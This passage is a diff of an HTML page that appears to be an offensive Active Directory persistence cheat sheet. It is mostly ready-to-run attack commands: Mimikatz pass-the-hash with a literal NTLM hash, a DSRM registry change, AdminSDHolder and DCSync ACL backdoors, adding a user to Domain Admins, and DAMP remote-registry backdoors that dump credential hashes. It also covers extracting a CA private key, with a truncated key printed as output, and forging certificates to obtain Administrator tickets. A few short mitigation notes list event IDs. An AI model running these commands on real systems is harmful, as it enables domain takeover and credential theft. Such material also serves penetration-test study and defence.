+PSPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\
+PSParentPath           : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
+PSChildName            : Lsa
+PSDrive                : HKLM
+PSProvider             : Microsoft.PowerShell.Core\Registry
 </code></pre></div></div>
 
 <blockquote>
   <p><strong>Note</strong>: If we get an error such as <em>“New-ItemProperty: The property already exists”</em> you need to modify it.</p>
 
   <p><code class="highlighter-rouge">Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"</code>
-<code class="highlighter-rouge">Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2</code></p>
+<code class="highlighter-rouge">Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2</code></p>
 </blockquote>
 
 <ul>
@@ -543,8 +865,24 @@ mimikatz# !-
 </ul>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"sekurlsa::pth /domain:dc01 /user:Administrator /ntlm:a9b30e5b0dc865eadcea9411e4ade72d /run:powershell.exe'</span>
-<span class="nb">ls</span> \\dc01\c<span class="err">$</span>
+
+PsExec.exe /accepeula \\dc01.corp.local powershell
 </code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: Is not possible to connect via <code class="highlighter-rouge">PSRemote</code>, so use <code class="highlighter-rouge">PsExec</code> instead.</p>
+</blockquote>
+
+<h2 id="mitigation-3">Mitigation</h2>
+
+<p>Look the logs:</p>
+
+<ul>
+  <li>Event ID <strong>4657</strong>: Audit creation/change of <code class="highlighter-rouge">HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</code></li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-WinEvent</span> -FilterHashtable @<span class="o">{</span><span class="nv">Logname</span><span class="o">=</span><span class="s1">'System'</span>;<span class="nv">ID</span><span class="o">=</span>4657<span class="o">}</span> | ?<span class="o">{</span><span class="nv">$_</span>.message -like <span class="s2">"*Kernel Mode Driver*"</span><span class="o">}</span>
+</code></pre></div></div>
+
 <h1 id="custom-security-support-provider-ssp">Custom Security Support Provider (SSP)</h1>
 
 <p>A security support provider is a dll which provides ways for an application to obtain an authenticated connection. Some SSP packages by microsoft are NTLM, kerberos, CredSSP…</p>
@@ -572,7 +910,18 @@ mimikatz# !-
 
 <p>All local logons on the domain controller are logged to <code class="highlighter-rouge">C:\Windows\system32\kiwissp.log</code>.</p>
 
-<h1 id="using-acls-adminsdholder">Using ACLs (AdminSDHolder)</h1>
+<h2 id="mitigation-4">Mitigation</h2>
+
+<p>Look the logs:</p>
+
+<ul>
+  <li>Event ID <strong>4657</strong>: Audit creation/change of <code class="highlighter-rouge">HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages</code></li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-WinEvent</span> -FilterHashtable @<span class="o">{</span><span class="nv">Logname</span><span class="o">=</span><span class="s1">'System'</span>;<span class="nv">ID</span><span class="o">=</span>4657<span class="o">}</span> | ?<span class="o">{</span><span class="nv">$_</span>.message -like <span class="s2">"*Kernel Mode Driver*"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<h1 id="adminsdholder">AdminSDHolder</h1>
 
 <p>Resides in the system container of a domain and used to control the permissions using an ACL for certain built-in privileged groups which are called the <code class="highlighter-rouge">protected groups</code>.</p>
 
@@ -603,6 +952,10 @@ mimikatz# !-
 <ul>
   <li>PowerView:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetADSprefix <span class="s1">'CN=AdminSDHolder,CN=System'</span> -PrincipalSamAccountName user1 -Rights All -Verbose
+</code></pre></div>    </div>
+  </li>
+  <li>PowerView (dev):
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity <span class="s1">'CN=AdminSDHolder,CN=System,DC=corp,DC=local'</span> -PrincipalIdentity user1 -Rights All
 </code></pre></div>    </div>
   </li>
   <li>ADModule:
@@ -648,11 +1001,13 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 
 <p>Finally we just need to abuse it.</p>
 
+<h1 id="acl-for-persistence">ACL for Persistence</h1>
+
 <h2 id="abusing-fullcontrol-acl">Abusing FullControl ACL</h2>
 
 <ul>
   <li>PowerView:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainGroupMember -Identity <span class="s1">'Domain Admins'</span> -Members user2 -Verbose
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-NetGroupUser -UserName user2 -GroupName <span class="s2">"Domain Admins"</span> -Domain corp.local
 </code></pre></div>    </div>
   </li>
   <li>ADModule:
@@ -671,6 +1026,7 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
   <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set-ADACcountPassword</span> -Identity user2 -NewPassword <span class="o">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"Password123!"</span> -AsPlainText -Force<span class="o">)</span> -Verbose
 </code></pre></div>    </div>
+    <h1 id="acls-rights-abuse">ACLs Rights Abuse</h1>
   </li>
 </ul>
 
@@ -691,13 +1047,17 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
   </li>
 </ul>
 
-<h2 id="abusing-dcsync-in-domain-root">Abusing DCSync in domain root</h2>
+<h2 id="dcsync-backdoor">DCSync Backdoor</h2>
 
 <p>There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like the ability to run <code class="highlighter-rouge">DCSync</code>.</p>
 
 <ul>
   <li>PowerView:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetDistinguishedName <span class="s1">'DC=corp,DC=local'</span> -PrincipalSamAccountName user1 -Rights DCSync -Verbose
+</code></pre></div>    </div>
+  </li>
+  <li>PowerView (dev):
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity user1 -Rights DCSync 
 </code></pre></div>    </div>
   </li>
   <li>ADModule:
@@ -719,7 +1079,7 @@ Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\Administr
 </code></pre></div></div>
 <p>So once we have obtained the hash NTLM of <em>any user</em> of the domain, <code class="highlighter-rouge">PassTheHash</code> or <code class="highlighter-rouge">Over-PassTheHash</code> attack can be executed.</p>
 
-<h2 id="security-descriptors">Security Descriptors</h2>
+<h1 id="acl-security-descriptors">ACL Security Descriptors</h1>
 
 <p>It is possible to modify Security Descriptors such as security information like owner, primary group, DACL and SACL of multiple remote access methods to allow access to non-admin users.</p>
 
@@ -727,14 +1087,14 @@ Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\Administr
 
 <p>Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL.</p>
 
-<p><code class="highlighter-rouge">ace\_type;ace\_flags;rights;object_guid;inherit\_object\_guid;account\_sid</code></p>
+<p><code class="highlighter-rouge">ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid</code></p>
 
 <p>ACE for built-in administrators for WMI namespaces</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A;CI;CCDCLCSWRPWPRCWD;;;&lt;SID&gt;
 </code></pre></div></div>
 
-<h3 id="wmi">WMI</h3>
+<h2 id="wmi">WMI</h2>
 
 <p>ACLs can be modified to allow non-admin users access to securable objects with <code class="highlighter-rouge">Set-RemoteWMI.ps1</code>:</p>
 
@@ -749,7 +1109,7 @@ Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\Administr
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace <span class="s1">'root\cimv2'</span> -Remove -Verbose
 </code></pre></div></div>
 
-<h3 id="powershell-remoting">PowerShell Remoting</h3>
+<h2 id="powershell-remoting">PowerShell Remoting</h2>
 
 <p>Something similar we can do it with PowerShell Remoting with the script <code class="highlighter-rouge">Set-RemotePSRemoting.ps1</code>.</p>
 
@@ -760,33 +1120,117 @@ Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\Administr
 <span class="nb">Set</span>-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Remove
 </code></pre></div></div>
 
-<h3 id="remote-registry">Remote Registry</h3>
+<h2 id="remote-registry-backdoor">Remote Registry Backdoor</h2>
 
 <p>Using DAMP we can modify the registry with administrative privileges.</p>
 
 <p>On a remote machine with <code class="highlighter-rouge">Add-RemoteRegBackdoor.ps1</code> script.</p>
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Add-RemoteRegBackdoor.ps1
+
+<ul>
+  <li><a href="https://github.com/HarmJ0y/DAMP">https://github.com/HarmJ0y/DAMP</a></li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\DAMP-master\Add-RemoteRegBackdoor.ps1
 Add-RemoteRegBackdoor -ComputerName dc01.corp.local -Trustee user1 -Verbose
 </code></pre></div></div>
 <p>After that we can execute some interesting attacks such as getting accounts and machines hashes.</p>
 
 <ul>
   <li>Retrive machine account hash:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Get-RemoteMachineAccountHash
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\DAMP-master\Get-RemoteMachineAccountHash
 Get-RemoteMachineAccountHash -ComputerName dc01.corp.local -Verbose
 </code></pre></div>    </div>
   </li>
   <li>Retrieve local account hash:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Get-RemoteLocalAccountHash
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\DAMP-master\Get-RemoteLocalAccountHash
 Get-RemoteLocalAccountHash -ComputerName dc01.corp.local -Verbose
 </code></pre></div>    </div>
   </li>
   <li>Retrive domain cached credentials:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Get-RemoteCachedCredentials
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\DAMP-master\Get-RemoteCachedCredentials
 Get-RemoteCachedCredentials -ComputerName dc01.corp.local -Verbose
 </code></pre></div>    </div>
   </li>
 </ul>
+
+<h1 id="forged-certificates">Forged Certificates</h1>
+
+<p>Sometimes AD CS roles are installed on separate servers and not on the DC themselves. And often, they are no treated with the same sensitivity as DCs.</p>
+
+<p>Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate.</p>
+
+<p>With <code class="highlighter-rouge">SharpDPAPI</code> we can extract the private keys.</p>
+
+<ul>
+  <li><a href="https://github.com/GhostPack/SharpDPAPI">https://github.com/GhostPack/SharpDPAPI</a></li>
+</ul>
+
+<p>Run the following command on a <strong>Domain Controller</strong>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\SharpDPAPI.exe certificates /machine
+</code></pre></div></div>
+
+<p>The private CA key has the Issuer and Subject, both the distinguished name of the CA.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  File               : b2ddcffdd2d1598108758953e4e0356b_d0c48e6a-1237-4eca-bb8c-9b22df87997d
+
+    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+    Master Key GUID  : {c153dc41-b91b-4ca3-8196-0cf72bdbf7c0}
+    Description      : Private Key
+    algCrypt         : CALG_AES_256 (keyLen 256)
+    algHash          : CALG_SHA_512 (32782)
+    Salt             : 5ea093f4e1b8c9415d080cecc3acd145b63fc9420074d51ff7998a361fd5ec24
+    HMAC             : a2d1fee192cd5ab1e4304e87d8d31267d83a98290c9e08db513bcd7214b8f09b
+    Unique Name      : sub-ca
+
+    Thumbprint       : 697B1C2CD65B2ADC80C3D0CE83A6FB889B0CA08E
+    Issuer           : CN=ca, DC=corp, DC=local
+    Subject          : CN=sub-ca, DC=dev, DC=corp, DC=local
+    Valid Date       : 8/15/2022 4:06:13 PM
+    Expiry Date      : 8/15/2024 4:16:13 PM
+
+    [*] Private key file b2ddcffdd2d1598108758953e4e0356b_d0c48e6a-1237-4eca-bb8c-9b22df87997d was recovered:
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAy1qdXLFZUIIEnDQ4g2Lh3fmppE6h0+Lql/tRlUZH41qazAeI
+mezAMzphbzZxQeJP4MBSyqi21mhFt6sC48E5A0zlUbQduADsdQU7Ty6Zr9FzYva2
+MP/zhgnmMSUEKoEA5p9bk6WcSdxixJMfmeSdFQiTDZ
+
+</code></pre></div></div>
+
+<p>Save the private key into a <code class="highlighter-rouge">.pem</code> file and then convert it to <code class="highlighter-rouge">.pfx</code> with opeenssl.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Enter Export Password:
+Verifying - Enter Export Password:
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong> It is recommended to enter a password.</p>
+</blockquote>
+
+<p>Convert <code class="highlighter-rouge">cert.pfx</code> into base64.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat cert.pfx | base64 -w 0
+</code></pre></div></div>
+
+<p>Finally forge a certificate with <code class="highlighter-rouge">ForgeCert</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/GhostPack/ForgeCert">https://github.com/GhostPack/ForgeCert</a></li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword <span class="s2">"password"</span> --Subject <span class="s2">"CN=User"</span> --SubjectAltName <span class="s2">"Administrator@corp.local"</span> --NewCertPath fake.pfx --NewCertPassword <span class="s2">"password"</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: We need to specify in <code class="highlighter-rouge">SubjectAltName</code> a existant user in the domain.</p>
+</blockquote>
+
+<p>With the cerficiate we can ask a TGT.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus asktgt /user:Administrator /certificate:&lt;B64-CERT&gt; /password:password /nowrap
+</code></pre></div></div>
 
 			</article>
 		</section>
